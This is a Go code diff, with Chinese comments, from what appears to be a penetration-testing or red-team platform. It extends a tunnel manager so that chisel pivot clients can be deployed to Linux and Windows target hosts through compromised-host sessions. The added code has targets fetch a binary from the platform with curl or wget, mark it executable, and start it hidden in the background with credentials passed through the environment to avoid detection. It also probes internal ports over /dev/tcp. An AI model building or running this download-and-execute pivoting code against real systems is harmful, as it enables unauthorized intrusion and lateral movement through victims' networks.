@@ -43,6 +43,7 @@ type Manager struct {
 	stage           *stage.Manager
 	sessions        *session.Registry
 	chiselPath      string // 空 = 二进制缺失，Deploy 返回明确错误
+	chiselClientDir string // 目标端 chisel client 二进制目录（按 <os>-<arch> 查找）
 	suo5Path        string // 空 = suo5 二进制缺失，suo5 适配器 Deploy 返回明确错误
 	suo5PayloadsDir string // 空 = payloads 目录缺失，同上
 	dataDir         string // 平台侧隧道工作目录（authfile/日志）
@@ -62,6 +63,8 @@ type Options struct {
 	Stage      *stage.Manager
 	Sessions   *session.Registry
 	ChiselPath string // ARTEX_CHISEL_PATH 或 data/tools/chisel；不存在时 Deploy 明确报错
+	// ChiselClientDir 是目标端 chisel client 二进制目录（ARTEX_CHISEL_CLIENT_DIR 或 data/tools/chisel-clients）。
+	ChiselClientDir string
 	// Suo5Path 是 suo5 CLI 路径（ARTEX_SUO5_PATH 或 data/tools/suo5);
 	// Suo5PayloadsDir 是 payload 目录（ARTEX_SUO5_PAYLOADS_DIR 或 data/tools/suo5-payloads)。
 	// 缺失时仅 suo5 适配器 Deploy 报明确错误，不影响 chisel。
@@ -81,7 +84,7 @@ func NewManager(o Options) (*Manager, error) {
 	}
 	m := &Manager{
 		store: o.Store, stage: o.Stage, sessions: o.Sessions,
-		chiselPath: o.ChiselPath, dataDir: dir,
+		chiselPath: o.ChiselPath, chiselClientDir: o.ChiselClientDir, dataDir: dir,
 		suo5Path: o.Suo5Path, suo5PayloadsDir: o.Suo5PayloadsDir,
 		procs: map[int64]*exec.Cmd{},
 	}
@@ -94,6 +97,12 @@ func NewManager(o Options) (*Manager, error) {
 		}
 	} else {
 		log.Printf("[tunnel] 未配置 chisel 二进制（ARTEX_CHISEL_PATH 或 data/tools/chisel),tunnel_deploy 将报明确错误")
+	}
+	if m.chiselClientDir != "" {
+		if st, err := os.Stat(m.chiselClientDir); err != nil || !st.IsDir() {
+			log.Printf("[tunnel] client 目录不可读（%s): %v —— 跨 OS/架构部署将报错", m.chiselClientDir, err)
+			m.chiselClientDir = ""
+		}
 	}
 	if m.suo5Path != "" {
 		if sum, err := fileSHA256(m.suo5Path); err != nil {
@@ -190,6 +199,9 @@ func (m *Manager) Deploy(ctx context.Context, p *Plan) (*db.TunnelRecord, error)
 	if !ok {
 		return nil, fmt.Errorf("会话 %d 不在注册表，无法部署", p.ViaSessionID)
 	}
+	if err := m.prepareTarget(ctx, sess, p); err != nil {
+		return nil, err
+	}
 	rec := &db.TunnelRecord{
 		TaskID: p.TaskID, Kind: p.Kind, Adapter: p.Adapter,
 		ListenHost: p.ListenHost, ListenPort: p.ListenPort,
@@ -270,36 +282,60 @@ func (m *Manager) deployInto(ctx context.Context, id int64, sess session.Session
 	return nil
 }
 
-// deliver 经 stage 投递客户端二进制到目标 RemoteBin 并 chmod+x。
+// deliver 投递目标端客户端二进制：优先平台临时 HTTP 一次下载（跨主机可达，
+// 不依赖 stage 路由），其次旧 stage 一次性 URL，最后会话分块写入。
 func (m *Manager) deliver(ctx context.Context, sess session.Session, p *Plan) error {
-	if m.stage == nil {
-		return fmt.Errorf("stage 暂存服务未启用，无法投递")
+	if p.TargetOS == "windows" {
+		return m.deliverWindows(ctx, sess, p)
 	}
-	entry, err := m.stage.PutFile(m.chiselPath, stage.PutOpts{
-		OneShot: true, TaskID: strconv.FormatInt(p.TaskID, 10),
-	})
-	if err != nil {
-		return fmt.Errorf("stage 投递失败: %w", err)
+	clientBin := p.ClientBinary
+	if clientBin == "" {
+		var derr error
+		clientBin, derr = m.clientBinaryFor(p)
+		if derr != nil {
+			return derr
+		}
 	}
-	p.StageToken = entry.Token
-	// stage URL 主机是平台主监听地址（0.0.0.0 时还是回环占位），目标未必可达；
-	// 换成 callback host（目标回连平台用的地址），端口保留主监听口。
-	dlURL := rewriteURLHost(entry.URL, p.PlatformAddr)
-	dl := fmt.Sprintf(`mkdir -p %s && (curl -fsSL -m 90 '%s' -o %s 2>/dev/null || wget -q -T 90 -O %s '%s' 2>/dev/null) && echo ARTEX_DL_OK || echo ARTEX_DL_FAIL`,
-		p.RemoteDir, dlURL, p.RemoteBin, p.RemoteBin, dlURL)
-	stdout, _, err := sess.Exec(ctx, dl, remoteExecWait)
-	if err == nil && strings.Contains(stdout, "ARTEX_DL_OK") {
-		return m.chmodRemote(ctx, sess, p)
-	}
-	// 回退：目标无 curl/wget（或被拦）——经会话分块写入（session.WriteFile 内部分块）。
-	log.Printf("[tunnel] 目标直接下载失败，回退会话分块写入（%s)…", p.RemoteDir)
-	data, rerr := os.ReadFile(m.chiselPath)
+	data, rerr := os.ReadFile(clientBin)
 	if rerr != nil {
 		return fmt.Errorf("读取本地 chisel 失败: %w", rerr)
 	}
 	if _, _, err := sess.Exec(ctx, "mkdir -p "+p.RemoteDir, probeTimeout); err != nil {
 		return fmt.Errorf("远端目录创建失败: %w", err)
 	}
+	name := p.RemoteBin
+	if i := strings.LastIndexAny(name, "/\\"); i >= 0 {
+		name = name[i+1:]
+	}
+	if dlURL, stop, derr := m.serveBinaryOnce(ctx, p, data, name); derr == nil {
+		dl := fmt.Sprintf("(curl -fsSL -m 90 '%s' -o %s 2>/dev/null || wget -q -T 90 -O %s '%s' 2>/dev/null) && echo ARTEX_DL_OK || echo ARTEX_DL_FAIL",
+			dlURL, p.RemoteBin, p.RemoteBin, dlURL)
+		out, _, xerr := sess.Exec(ctx, dl, remoteExecWait)
+		stop()
+		if xerr == nil && strings.Contains(out, "ARTEX_DL_OK") {
+			return m.chmodRemote(ctx, sess, p)
+		}
+		log.Printf("[tunnel] 一次性 HTTP 投递失败，尝试 stage: %s", detailOf(out))
+	}
+	if m.stage != nil {
+		entry, err := m.stage.PutFile(clientBin, stage.PutOpts{
+			OneShot: true, TaskID: strconv.FormatInt(p.TaskID, 10),
+		})
+		if err != nil {
+			log.Printf("[tunnel] stage 投递失败（回退会话写入）: %v", err)
+		} else {
+			p.StageToken = entry.Token
+			dlURL := rewriteURLHost(entry.URL, p.PlatformAddr)
+			dl := fmt.Sprintf("(curl -fsSL -m 90 '%s' -o %s 2>/dev/null || wget -q -T 90 -O %s '%s' 2>/dev/null) && echo ARTEX_DL_OK || echo ARTEX_DL_FAIL",
+				dlURL, p.RemoteBin, p.RemoteBin, dlURL)
+			out, _, xerr := sess.Exec(ctx, dl, remoteExecWait)
+			if xerr == nil && strings.Contains(out, "ARTEX_DL_OK") {
+				return m.chmodRemote(ctx, sess, p)
+			}
+			log.Printf("[tunnel] stage 下载失败，回退会话分块写入: %s", detailOf(out))
+		}
+	}
+	log.Printf("[tunnel] 回退会话分块写入（%s)…", p.RemoteDir)
 	if err := sess.WriteFile(ctx, p.RemoteBin, data); err != nil {
 		return fmt.Errorf("会话分块写入失败: %w", err)
 	}
@@ -327,6 +363,9 @@ func rewriteURLHost(rawURL, platformAddr string) string {
 }
 
 func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan) error {
+	if p.TargetOS == "windows" {
+		return nil // Windows 无 chmod；文件写为 .exe 直接可执行
+	}
 	stdout, _, err := sess.Exec(ctx, fmt.Sprintf("chmod +x %s && echo ARTEX_CHMOD_OK || echo ARTEX_CHMOD_FAIL", p.RemoteBin), probeTimeout)
 	if err != nil {
 		return fmt.Errorf("chmod 执行失败: %w", err)
@@ -339,6 +378,9 @@ func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan
 
 // spawnRemote 远端后台拉起 client，经哨兵取回真实 pid。
 func (m *Manager) spawnRemote(ctx context.Context, sess session.Session, p *Plan) (int, error) {
+	if p.TargetOS == "windows" {
+		return m.spawnRemoteWindows(ctx, sess, p)
+	}
 	// AUTH 经 env 注入（chisel client 在 --auth 缺省时读 AUTH env)——auth 不出现在
 	// 目标机 ps cmdline;取舍：/proc/<pid>/environ 对同 uid 仍可见，目标已是立足点，可接受。
 	spawn := fmt.Sprintf(`cd %s && setsid env AUTH='%s:%s' nohup ./ch %s > %s 2>&1 < /dev/null & echo ARTEX_PID=$!`,
@@ -417,8 +459,13 @@ func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) err
 		return nil
 	case KindPortfwd:
 		// 预检：目标侧真实可达 target:port（反向监听对失败拨号也会 accept，不能只信入口）。
-		pre := fmt.Sprintf(`bash -c 'timeout 5 bash -c "</dev/tcp/%s/%d"' 2>/dev/null && echo ARTEX_PRE_OK || echo ARTEX_PRE_FAIL`,
-			p.TargetHost, p.TargetPort)
+		var pre string
+		if p.TargetOS == "windows" {
+			pre = windowsPrecheckCommand(p.TargetHost, p.TargetPort)
+		} else {
+			pre = fmt.Sprintf(`bash -c 'timeout 5 bash -c "</dev/tcp/%s/%d"' 2>/dev/null && echo ARTEX_PRE_OK || echo ARTEX_PRE_FAIL`,
+				p.TargetHost, p.TargetPort)
+		}
 		stdout, _, err := sess.Exec(ctx, pre, probeTimeout)
 		if err != nil || !strings.Contains(stdout, "ARTEX_PRE_OK") {
 			return fmt.Errorf("目标侧预检 %s:%d 不可达（从立足点实测）: %s", p.TargetHost, p.TargetPort, detailOf(stdout))
@@ -474,7 +521,9 @@ func (m *Manager) rollback(ctx context.Context, id int64, sess session.Session, 
 	if p.RemotePID > 0 {
 		m.killRemote(ctx, sess, p)
 	}
-	if p.RemoteDir != "" {
+	if p.TargetOS == "windows" {
+		_, _, _ = sess.Exec(ctx, windowsRemoveDirCommand(p.RemoteDir), probeTimeout)
+	} else if p.RemoteDir != "" {
 		_, _, _ = sess.Exec(ctx, "rm -rf "+p.RemoteDir, probeTimeout)
 	}
 	m.killServer(id, p)
@@ -492,6 +541,10 @@ func (m *Manager) rollback(ctx context.Context, id int64, sess session.Session, 
 // killRemote 经会话杀目标侧进程：先 kill -0 并核对 /proc/<pid>/cmdline 含远端
 // 二进制路径——查【远端】，且防 pid 复用误杀（PivotHub 查本机的缺陷在此修正）。
 func (m *Manager) killRemote(ctx context.Context, sess session.Session, p *Plan) {
+	if p.TargetOS == "windows" {
+		m.killRemoteWindows(ctx, sess, p)
+		return
+	}
 	chk := fmt.Sprintf(`kill -0 %d 2>/dev/null && tr '\0' ' ' < /proc/%d/cmdline 2>/dev/null || echo ARTEX_NO_PROC`, p.RemotePID, p.RemotePID)
 	stdout, _, err := sess.Exec(ctx, chk, probeTimeout)
 	if err != nil || strings.Contains(stdout, "ARTEX_NO_PROC") {
